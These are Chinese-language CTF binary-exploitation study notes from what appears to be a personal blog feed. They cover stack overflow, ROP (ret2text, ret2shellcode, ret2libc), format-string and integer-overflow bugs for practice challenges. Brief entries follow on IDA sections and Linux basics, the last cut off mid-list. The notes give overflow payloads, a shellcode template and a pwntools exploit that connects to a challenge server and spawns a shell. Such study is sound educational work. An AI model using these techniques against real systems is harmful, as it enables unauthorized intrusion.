        <content type="html"><![CDATA[<h1><span id="0x01-nc直接连">0x01 nc直接连</span></h1><p>当题目中直接出现了**”/bin/sh”<strong>、</strong>cat flag**时运行后nc即可</p><p><strong><em>例题：攻防世界 get_shell</em></strong></p><h1><span id="0x02-变量的覆盖">0x02 变量的覆盖</span></h1><p>1.算出两变量在段中的差值:</p><ul><li><p>​     可以直接在payload中直接写算式【’a’*(0x6C-0x68)】</p></li><li><p>​     也可以用计算器算出结果后再写入payload【’a’*4】</p></li></ul><p>2.再加上想输入的值</p><p><strong><em>例题：攻防世界 hello_pwn</em></strong></p><p><img src="/images/zj5.png" alt="zj5"></p><p><img src="/images/zj6.png" alt="zj6"></p><p>可以看到unk_601068允许输入的长度是10，而unk_601068和dword_60106C在.bss段相差4（6c-68）</p><p>于是可以想到在unk_601068中输入4个数覆盖掉dword_60106C再输入自己想要的值</p><p>payload = ‘a’*4 + p64(1853186401)</p><h1><span id="0x03-栈溢出">0x03 栈溢出</span></h1><p>栈溢出是指向栈中写入了超出限定长度的数据，溢出的数据会覆盖栈中其它数据，从而影响程序的运行。</p><p><strong>前提：stack未开启</strong></p><p>算出变量到ret的长度，再写入想输入的值即可</p><p><strong><em>例题：攻防世界 level0</em></strong></p><p><img src="/images/zj7.png" alt="zj7"></p><p><img src="/images/zj8.png" alt="zj8"></p><p><img src="/images/zj9.png" alt="zj9"></p><p><img src="/images/zj10.png" alt="zj10"></p><p>可以看出没有开启栈保护，200远大于80</p><p>直接栈溢出即可</p><p>payload = ‘a’*(0x80+0x08) + p64(0x040059A)</p><h1><span id="0x04-gets溢出漏洞">0x04 gets()溢出漏洞</span></h1><p>例如 gets(s) , 不管 s  的空间是否够用，gets函数一直都会往s里输东西，这就存在溢出问题</p><p>于是可以用gets()溢出来达到修改某个变量的值的效果</p><p><strong><em>例题：攻防世界 when_did_you_born</em></strong></p><p><img src="/images/zj11.png" alt="zj11"></p><p>gets函数的漏洞，利用v4覆盖掉v5的地址后改为1926即可</p><p><img src="/images/zj12.png" alt="zj12"></p><h1><span id="0x05-rop">0x05 ROP</span></h1><p>一直把栈溢出的作用当成了ROP的作用，后来才发现栈溢出只是ROP里的一个环节</p><p>栈溢出控制点一般是在ret处，ROP的核心思想就是<strong>利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程</strong></p><h2><span id="0x001-ret2text">0x001 ret2text</span></h2><p>ret2text 又可以理解为是ret to text，顾名思义就是<strong>将应该返回EIP的地址改成text中的某个地址</strong></p><p>上面0x03栈溢出提到的level0就是个很好的例子，就不赘述了</p><p>讲讲攻防世界的level2：</p><p><strong><em>例题：攻防世界level2</em></strong>（system内并没有写入“/bin/sh”地址）</p><p><img src="/images/zj13.png" alt="zj13"></p><p><img src="/images/zj14.png" alt="zj14"></p><p>这应该是属于ret2text的一种变式，很明显的栈溢出</p><p>按f12发现给出了system和”/bin/sh”，但是点开system会发现system内并没有写入“/bin/sh”</p><p><img src="/images/zj24.png" alt="zj24"></p><p>“/bin/sh”的地址被单独给出来了</p><p><img src="/images/zj25.png" alt="zj25"></p><p>所以要在payload中将“/bin/sh”写入system</p><p>system()和“/bin/sh”的地址怎么找呢？</p><p>一种是在IDA中直接找（之前太菜找不到，尤其是找system）</p><p>一种是在payload中通过函数查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前提：elf &#x3D; ELF（&#39;level2&#39;）</span><br><span class="line">sys_addr &#x3D; elf.symbols[&#39;system&#39;]</span><br><span class="line">sh_addr  &#x3D; elf.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()</span><br></pre></td></tr></table></figure><p>最后的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39;*(0x88+0x4) + p32(sys_addr) + &#39;aaaa&#39; + p32(sh_addr)# &#39;aaaa&#39;是system函数的返回地址</span><br></pre></td></tr></table></figure><p><strong><em>例题：攻防世界cgpwn2</em></strong>（ 没有/bin/sh）</p><p>可将/bin/sh写入未初始化变量                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         </p><h2><span id="0x002-ret2shellcode">0x002 ret2shellcode</span></h2><p><strong>将返回地址（EIP）覆盖到我们插入shellcode的首地址</strong></p><p><strong>前提：NX未开启</strong></p><p>先讲讲shellcode的概念：shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。说白了就是一段能得到权限的独立代码</p><p>利用pwntools中自带的shellcraft基本写法（应该可以当模板记）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前缀：context(os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;amd64&#39;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br></pre></td></tr></table></figure><p><strong><em>例题：攻防世界string</em></strong></p><p>详情见其他博客</p><h2><span id="0x003-ret2libc">0x003 ret2libc</span></h2><p>当开启了NX时，数据所在的内存页会标记为不可执行，此时再执行shellcode就会抛出异常。既然注入新代码不可行，那么就复用程序中已有的代码。而libc.so几乎在每个程序执行时都会加载，就可以利用libc中的函数。（当然 .text 中本身就有可用函数更好 , .text走投无路才会想着用libc）</p><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p><p>具体GOT、PLT知识见：<a href="https://linyt.blog.csdn.net/article/details/51635768">https://linyt.blog.csdn.net/article/details/51635768</a></p><p>整个看了个大概，但是有些地方还是有点懵</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void print_banner()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Welcome to World of PLT and GOT\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GCC编译（一段完整代码的运行）可分为预处理、编译、汇编、链接四个阶段</p><p>当处在汇编阶段时，所有元素的地址都是虚拟的，链接操作后，所有元素的地址才会被修改（重定位）为实际地址</p><p>printf函数位于glibc动态库中，编译阶段编译器并不知道printf函数是在suoyiglibc库中的（链接阶段是可以知道printf定义在哪的，只是如果定义在动态库就不知道具体的地址），于是链接器会生成一段额外的小代码片段来获取printf函数地址，并完成对它的调用。</p><p>GOT表示存放函数地址的数据表，PLT表表示额外代码段表。</p><p><img src="/images/zj39.png" alt="zj39"></p><h3><span id="解题思路">解题思路</span></h3><p>附件一般会给出libc.so的文件</p><p>暂时只发现了两种算法，但是原理都是一样的，当有其中一个函数的真实地址后，其他函数的真实地址可以根据偏移值算出</p><p>①算出“参照函数“libc和elf的偏移值，以它为base，再找出所求函数的libc值，再加减base得出真实地址</p><p>例如：攻防世界forgot 的exp</p><p><img src="/images/zj40.png" alt="zj40"></p><p>②算出所求函数与”参照函数“在libc中的偏移值，等到知道”参照函数“的真实地址后，再根据此偏移值算所求函数的真实地址</p><p>例如：攻防世界leve3 的exp</p><p><img src="/images/zj41.png" alt="zj41"></p><p><strong><em>例题：攻防世界level3</em></strong></p><p>详情见其他博客</p><h1><span id="0x06-格式化字符串漏洞">0x06 格式化字符串漏洞</span></h1><p>参考：<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p><p>（也不知道讲不讲的清。。。。）</p><p>首先了解一个格式化字符串“%n”</p><p>%n表示的是将<strong>已经打印出来的字符个数</strong>，赋值给一个变量</p><p><img src="/images/zj26.png" alt="zj26"></p><p>%n之前打印了5个a，所以n的值变成了5。</p><h2><span id="漏洞成因和基本原理">漏洞成因和基本原理</span></h2><p>正常的printf：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  int n&#x3D;5;</span><br><span class="line">  printf(&quot;%d&quot;,n);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但有人偷懒会写成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[]&#x3D;&quot;neuqcsa&quot;;</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，这是可以输出的，输出就为neuqcsa</p><p>但是当我们输入的是字符串就会出问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[100];</span><br><span class="line">  scanf(&quot;%s&quot;,a);</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如我们输入的字符串是“%x%x%x”</p><p><img src="/images/zj27.png" alt="zj27"></p><p>可以看到本意是想输出字符串“%x%x%x”,却输出了内存中的一段地址</p><p>再看看printf函数的堆栈图：（参数从右向左入栈）</p><p><img src="/images/zj28.png" alt="zj28"></p><p><img src="/images/zj29.png" alt="zj29"></p><p><strong>printf函数并不知道参数的个数，它只会通过指针去搜索格式化字符串，然后根据格式化字符串的类型输出相应参数的值，直到搜索完最后一个格式化字符串</strong></p><p>所以尽管没有参数，也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。</p><h2><span id="任意内存的读取及任意内存写入">任意内存的读取及任意内存写入</span></h2><p>任意的内存的读取需要用到格式化字符串 <strong>%s</strong>，其对应的参量是一个指向<strong>字符串首地址</strong>的指针，作用是<strong>输出这个字符串</strong>。</p><p><strong>局部变量是存储在栈中的</strong></p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[100];</span><br><span class="line">  scanf(&quot;%s&quot;,a);</span><br><span class="line">  printf(a);</span><br><span class="line">  system(&quot;pause&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以得到：</p><p><img src="/images/zj30.png" alt="zj30"></p><p>看下堆栈图：<br> 这是调用scanf函数前的堆栈图。</p><p><img src="/images/zj32.png" alt="zj32"></p><p>输入字符串后的堆栈图：</p><p><img src="/images/zj31.png" alt="zj31"></p><p>调用printf函数的过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax，数组首地址</span><br><span class="line">push eax  </span><br><span class="line">call printf</span><br></pre></td></tr></table></figure><p>该过程只是将数组的首地址入栈，此时堆栈图如下。</p><p><img src="/images/zj33.png" alt="zj33"></p><p>所以在格式化字符串里用很多的%x 就一定可以找到这个AAAA的位置。我们将这个位置记下来，实例中就是第七个%x的位置，即第7个参数。</p><p>这里说下可以直接读取第七个参数的方法。（在linux下有用，win下没用）<br> %&lt; number&gt;$x 是直接读取第number个位置的参数，同样可以用在%n，%d等等。<br> 但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化字符串开始的第一个，应该是%7 $n</p><h3><span id="修改内存">修改内存</span></h3><p><img src="/images/zj34.png" alt="zj34"></p><p>得到b的地址</p><p><img src="/images/zj35.png" alt="zj35"></p><p>这里是第九个参数。<br> 接着用shellcode编码将b的地址写入，并查看能否写入成功。</p><p><img src="/images/zj36.png" alt="zj36"></p><p>用%n修改其值。</p><p><img src="/images/zj37.png" alt="zj37"></p><p>因为%n之前打印了75个字符，所以这里将b的值从0修改为75</p><p><strong>你也可以通过%&lt; number &gt;$n 来直接修改第九个参数来修改b的值</strong>。</p><p><img src="/images/zj38.png" alt="zj38"></p><p>在%n之前打印了4个字符，所以b的值直接被修改为4了</p><p><strong><em>例题：攻防世界CGfsb</em></strong></p><p><img src="/images/zj17.png" alt="zj17"></p><p><img src="/images/zj18.png" alt="zj18"></p><p>pwnme为8时就能拿到flag，问题是并没有能输入pwnme的地方</p><p>但是pwnme的上方有一个printf（&amp;s）明显的格式化字符串漏洞，可以以此来改变pwnme的值</p><p>看看偏移值：</p><p><img src="/images/zj19.png" alt="zj19"></p><p>可以看出偏移值是10</p><p>上exp：</p><p><img src="/images/zj20.png" alt="zj20"></p><p>注意%10$n处要加引号</p><h1><span id="0x07-strcpy漏洞">0x07 strcpy漏洞</span></h1><p>参考：<a href="https://blog.csdn.net/bjbz_cxy/article/details/80388908">https://blog.csdn.net/bjbz_cxy/article/details/80388908</a></p><p>strcpy是标准C库函数，不会去检查越界问题，所以它可以直接将内存中的值修改</p><h1><span id="0x08-整数溢出">0x08 整数溢出</span></h1><p>参考:<a href="https://zhuanlan.zhihu.com/p/28563004">https://zhuanlan.zhihu.com/p/28563004</a></p><p>整数分为有符号和无符号</p><p>异常情况有三种：①溢出   ②回绕   ③截断</p><h2><span id="溢出">溢出</span></h2><p>表现在有符号整数上，有符号整数有正值、负值和零，有向上溢出和向下溢出两种。假设用k个字节表示一个整型变量, 那么这个变量可以表示的有符号整数的范围是-2^(8k-1) ~ 2^(8k-1) –  1,那么两个正整数或者两个负整数相加就有可能超过这个整型变量所能表示的范围, 向上超出&gt;2^(8k-1) – 1我们称之为向上溢出,  向下超出&lt;-2^(8k-1), 我们称之为向下溢出. </p><p>对于signed char,正整数最大值为127，负整数最小值为128。unsigned char所能表示的最大值为255。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">signed char x;</span><br><span class="line">x &#x3D; 125 + 5;</span><br></pre></td></tr></table></figure><p>上面代码会输出：-126，因为130的二进制位为10000010，符号为1，表示负数。对于有符号整型，负数是用补码表示的，即绝对值取反后加一。根据之前方法逆向回去，先减一后再取反得01111110，即126.所以10000010表示的是-126。</p><h2><span id="回绕">回绕</span></h2><p>溢出后的数会以2^(8*sizeof(type))作模运算</p><p>例如一个unsigned char（1字符，8bits）溢出了，会把溢出的值与256求模</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">  unsigned char x;</span><br><span class="line">  x &#x3D; 128 + 130;</span><br><span class="line">  printf(&quot;%d\n&quot;,x);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会输出2，因为258%256=2</p><h2><span id="截断">截断</span></h2><p>将一个较大宽度的数存入较小宽度的操作数中时，高位会发生截断（一般只取后八位）</p><p><strong><em>例题：攻防世界int_overflow</em></strong></p><p><a href="https://makabaka-yyds.github.io/2021/01/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bint_overflow/">详情见</a></p><h1><span id="0x09-dynelf">0x09 DynELF</span></h1><p>具体原理见：</p><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;ctid=157">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;ctid=157</a></p><p><a href="https://www.anquanke.com/post/id/85129">【技术分享】借助DynELF实现无libc的漏洞利用小结 - 安全客，安全资讯平台 (anquanke.com)</a></p><p><strong><em>例题：攻防世界pwn100</em></strong></p><p>详情见其他博客</p><h1><span id="0x10-万能gadget">0x10 万能gadget</span></h1><p><a href="https://xz.aliyun.com/t/5597#toc-1">万能gadget</a></p><p><strong><em>例题：攻防世界pwn100</em></strong></p><p>详情见其他博客</p><h1><span id="0x0n-杂七杂八">0x0N  杂七杂八</span></h1><h2><span id="0x001-地址查找函数">0x001 地址查找函数</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前提：elf &#x3D; ELF（&#39;level2&#39;）</span><br><span class="line">sys_addr &#x3D; elf.symbols[&#39;system&#39;]#在elf这个文件中查找system函数的地址</span><br><span class="line">sh_addr  &#x3D; elf.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()#在文件中查找写有字符串“&#x2F;bin&#x2F;sh”的地址</span><br></pre></td></tr></table></figure><h2><span id="0x002-关于systembinsh">0x002 关于system(/bin/sh)</span></h2><p>system（）函数调用的是地址</p><p>/bin/sh只是一个字符串，所以在 f12+shift 以及查找函数查出来的都是写有 “/bin/sh” 这个内容的地址</p><h2><span id="0x003-关于rand和srand">0x003 关于rand和srand</span></h2><p>随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。<br><strong><em>例题：攻防世界guess_num</em></strong></p><p><img src="/images/zj21.png" alt="zj21"></p><p><img src="/images/zj22.png" alt="zj22"></p><p><img src="/images/zj23.png" alt="zj23"></p><p>gets的输出漏洞，v6是一个随机数，后面有一个判断，如果v4能与v6相等，那么就能拿到flag，而正好我们可以通过gets输出漏洞控制seed[0]让它每次产生的随机数都能被我们预知</p><h5><span id="关于ctype库与dll">关于ctype库与dll</span></h5><p>我们使用python标准库中自带的ctypes模块进行python和c的混合编程</p><h5><span id="libc共享库">libc共享库</span></h5><p>可以使用ldd查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~&#x2F;Desktop&#x2F;black&#x2F;GFSJ&#x2F;guess_num$ ldd guess_num </span><br><span class="line">    linux-vdso.so.1 &#x3D;&gt;  (0x00007ffd3f5a0000)</span><br><span class="line">    libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007f1e6c0b0000)</span><br><span class="line">    &#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007f1e6c67d000)</span><br></pre></td></tr></table></figure><p>也可以在脚本中通过elf文件查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf &#x3D; ELF(&#39;.&#x2F;guess_num&#39;)</span><br><span class="line">libc &#x3D; elf.libc</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from ctypes import*</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.243&#39;,56846)</span><br><span class="line"></span><br><span class="line">libc &#x3D; cdll.LoadLibrary(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">p.recvuntil(&quot;Your name:&quot;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x30-0x10) + p64(1)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc.srand(1)</span><br><span class="line">for i in range(10):      #循环写法（循环10次）</span><br><span class="line">   num &#x3D; str(libc.rand()%6+1)</span><br><span class="line">   p.recvuntil(&quot;number:&quot;)</span><br><span class="line">   p.sendline(num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x004-text-data-bss等的区别">0x004 .text .data .bss等的区别</span></h2><p> 原博客：<a href="https://blog.csdn.net/qq_27350133/article/details/103796444">https://blog.csdn.net/qq_27350133/article/details/103796444</a></p><ul><li><p>.text段是代码段。它用来放程序代码（code）。它通常是只读的（程序代码，编译好了就确定了，不可能改来改去的嘛）。</p></li><li><p>.data(ZI data)段是数据段。它用来存放初始化了的（initailized）全局变量（global）和初始化了的静态变量（static）。它是可读可写的。</p></li><li><p>.bss(RW data )段是全局变量数据段。它用来存放未初始化的（uninitailized）全局变量（global）和未初始化的静态变量</p><p>例如：</p></li></ul><p><img src="/images/IDA1.png" alt="IDA1"></p><p><img src="/images/IDA2.png" alt="IDA2"></p><p>代表pwnme（未初始化的全局变量）的地址</p><p><img src="/images/IDA3.png" alt="IDA3"></p><p>代表将ds赋值给eax寄存器的程序代码的地址</p><h2><span id="0x005-p3264与u3264的区别">0x005 p32（64）与u32（64）的区别</span></h2><p>p32是人发给机器</p><p>u32是机器发给机器</p><h2><span id="0x006-precv4与precv4的区别">0x006 p.recv(4)与p.recv()[:4]的区别</span></h2><p>p.recv(4)表示接受字符数为4</p><p>p.recv()[:4]表示接收到第四个字符</p><p>p.recv()[2:4]表示从第二个字符接收到第四个字符</p><p>p.recv()[:-1]表示一直接收</p><p>p.recvuntil(\n)[:-1]代表接收除去\n的所有数</p><h2><span id="0x007">0x007</span></h2><p>str()将括号内的东西打包成字符串</p><p>int( ,16)将括号内东西打包成16进制数</p><h2><span id="0x008-寄存器与偏移地址">0x008 寄存器与偏移地址</span></h2><p><strong>什么是寄存器？</strong></p><p>给有特定功能的内存单元取一个别名，这个别名就是我们经常说的寄存器。</p><p><strong>什么是寄存器映射？</strong></p><p>给存储器分配地址的过程叫存储器映射，再分配一个地址叫重映射。</p><p><strong>什么是偏移地址？</strong></p><p>偏移地址是计算机里的内存分段后，在段内某一地址相对于段首地址（段地址）的偏移量。偏移地址也成为偏移量</p><p>有效地址 = 基地址 + 偏移地址</p><h2><span id="0x009-readelf">0x009 readelf</span></h2><p>用于解析ELF格式目标文件的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s libc_32.so.6|grep 函数名</span><br></pre></td></tr></table></figure><p>可查找函数在libc中的地址</p><p>不同的 ”-x“会有不同的用法</p><h2><span id="0x010-strings">0x010 strings</span></h2><p>用于在二进制文件中（ELF）查找可打印的字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -at x libc_32.so.6|grep &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>可查找”/bin/sh“的地址</p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA</title>
      <link href="/2021/01/26/IDA/"/>
      <url>/2021/01/26/IDA/</url>
      
        <content type="html"><![CDATA[<p>原博客：<a href="https://blog.csdn.net/qq_27350133/article/details/103796444">https://blog.csdn.net/qq_27350133/article/details/103796444</a></p><h1><span id="text-data-bss等的区别">.text .data .bss等的区别</span></h1><ul><li><p>.text段是代码段。它用来放程序代码（code）。它通常是只读的（程序代码，编译好了就确定了，不可能改来改去的嘛）。</p></li><li><p>.data(ZI data)段是数据段。它用来存放初始化了的（initailized）全局变量（global）和初始化了的静态变量（static）。它是可读可写的。</p></li><li><p>.bss(RW data )段是全局变量数据段。它用来存放未初始化的（uninitailized）全局变量（global）和未初始化的静态变量</p><p>例如：</p></li></ul><p><img src="/images/IDA1.png" alt="IDA1"></p><p><img src="/images/IDA2.png" alt="IDA2"></p><p>代表pwnme（未初始化的全局变量）的地址</p><p><img src="/images/IDA3.png" alt="IDA3"></p><p>代表将ds赋值给eax寄存器的程序代码的地址</p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基本操作</title>
      <link href="/2021/01/24/Linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2021/01/24/Linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>原博客：<a href="https://blog.csdn.net/qq_41923771/article/details/81452529">https://blog.csdn.net/qq_41923771/article/details/81452529</a></p><p><a href="https://blog.csdn.net/niexinming/article/details/78814422">https://blog.csdn.net/niexinming/article/details/78814422</a></p><h1><span id="什么是linux">什么是Linux</span></h1><p>Linux在操作使用中时通过 输入命令——shell解释——内核处理</p><p>Linux的内核一般包含五大部分：进程管理、存储管理、文件管理、设备管理和网络管理，是一组程序模块，具有访问硬件设备和所有主存空间的权限，是仅有的能够执行特权指令的程序。主要功能是：资源抽象、资源分配、资源共享。（相当于Linux的核心所在）</p><p>shell作用：</p><p>内核是 如何对资源进行合理的分配 和 如何对用户需要作出处理 ，</p><p>1.所有的要执行的进程都要和shell建立连接，shell相当于Linux内核和外界沟通的唯一途径，shell通过分析所有进程的重要性来对各个进程的先后顺序进行合理化分配，从而使得系统更加高效</p><p>2.当客户对内核发出指令时，shell将会将客户所发出的指令进行类似翻译后告诉内核，内核在执行相应的命令</p><p>3.shell在流程中也起到了对内核作保护的作用，将外界指令的安全性进行了处理，内核只需要执行shell传出来的指令即可，增加了工作效率</p><hr><h1><span id="linux常用基础指令">Linux常用基础指令</span></h1><h2><span id="1命令行行提示符含义">1.命令行行提示符含义：</span></h2><p><img src="https://img-blog.csdn.net/20180806141908806?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="a"></p><p>kiosk:                       用户名称（root则表示为超级用户）</p><p>@：                          分隔符</p><p>foundation31：     主机名称</p><p>~:                              当前所在系统目录（输入pwd，可以显示当先目录，～为默认， 如果切换目录则会相应的改                                 变）</p><h2><span id="2超级用户登录">2.超级用户登录</span></h2><p>在命令行输入 su</p><p>再输入密码，登陆成功后命令提示符将会改变为root用户，身份提示符变为#</p><p><img src="https://img-blog.csdn.net/20180806143127448?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="b"></p><h2><span id="3linux系统结构">3.Linux系统结构</span></h2><p><img src="https://img-blog.csdn.net/2018080712321854?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>系统目录各个文件夹介绍：</p><p> /bin     ##二进制文件，系统常规命令<br> /boot     ##系统启动分区，系统启动时读取的文件<br> /dev     ##设备文件<br> /etc     ##大多数配置文件<br> /home     ##普通用户的家目录<br> /lib     ##32位函数库<br> /lib64     ##64位库<br> /media     ##手动临时挂载点<br> /mnt     ##手动临时挂载点<br> /opt     ##第三方软件安装位置<br> /proc     ##进程信息及硬件信息<br> /root     ##超级用户家目录<br> /run     ##临时设备的默认挂载点<br> /sbin     ##系统管理命令<br> /srv     ##数据<br> /var     ##数据<br> /sys     ##内核相关信息<br> /tmp     ##临时文件<br> /usr     ##用户相关设定</p><h2><span id="4linux下的文件管理">4.Linux下的文件管理</span></h2><h3><span id="1建立空白文件">1.建立空白文件</span></h3><p>touch file                建立空文件，或修改文件的时间戳<br>touch file1 file2     建立多个文件（file1 file2）</p><p><img src="https://img-blog.csdn.net/20180807123424400?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><h3><span id="2建立文件夹">2：建立文件夹</span></h3><p>mkdir        